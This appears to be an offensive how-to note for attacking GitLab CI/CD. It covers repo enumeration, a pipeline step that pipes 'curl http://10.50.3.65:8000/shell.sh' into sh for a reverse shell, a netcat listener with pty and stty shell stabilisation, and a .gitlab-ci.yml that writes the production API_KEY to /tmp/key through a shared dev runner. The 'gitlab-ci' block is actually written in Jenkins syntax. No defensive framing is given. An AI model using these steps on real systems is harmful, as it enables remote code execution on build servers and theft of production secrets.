This tools helps in efficiently enumerating the publicly visible repos

Use the above script and Gitlab API for enumuration.

Donot change the file name "enumerator.py"

Note: Make sure to install the Gitlab pip package using pip3 install python-gitlab==3.15.0

=======================================
replace the below lines in the .gitlab-ci.yml  file to get the reverse shell

pipeline {
    agent any
    stages {
       stage('build') {
          steps {
              sh '''
                    curl http://10.50.3.65:8000/shell.sh | sh
                '''                 
              }             
          }
       }       
    }


=======================================
simple reverse shell.sh

Update the attacker_Ip and port for to make connection
in the attacker machine type this 

nc -lvn PORT

After the reverse connection is established stabilize the shell using python 

Type the below command in the pawned machine

python3 -c 'import pty; pty.spawn("/bin/bash")'

after executing the above python shell do "ctrl + z" #terminate the shell and execute the below command in the attacker machine to connect back to the victim

stty raw -echo; fg

=======================================

Extracting the Production API key

If gitlab runners are same in the prod and dev server then we can able to extract the prod API key using the dev server.

Let say if the main is protected, then we cant do commeit and merge to the main branch, if we can able to do commits in dev branch, if the dev branch is also using the same running which prod is running
then we can use the dev branch .gitlab-ci.yml file to extract the prod api key.

Replace the .gitlab-ci.yml file in the dev as below, the below command might create the key in tmp/key directory of dev server, while commiting the changes look for the pipelines and jobs wether running or pending and manual. If its manual run the job manually, it might triger the script to run.

=======================================
""
  stages:
  - test
  - deploy

test:
  stage: test
  script:
    - 'echo "Testing Application: ${CI_PROJECT_NAME}"'

production:
  stage: deploy
  when: manual
  script:
    - 'echo "Deploying to ${CI_ENVIRONMENT_NAME}"'
    - 'echo "${API_KEY}" > /tmp/key'
    - 'echo "Ready to use the API KEY"'
  environment:
    name: ${CI_JOB_NAME}
""
=======================================
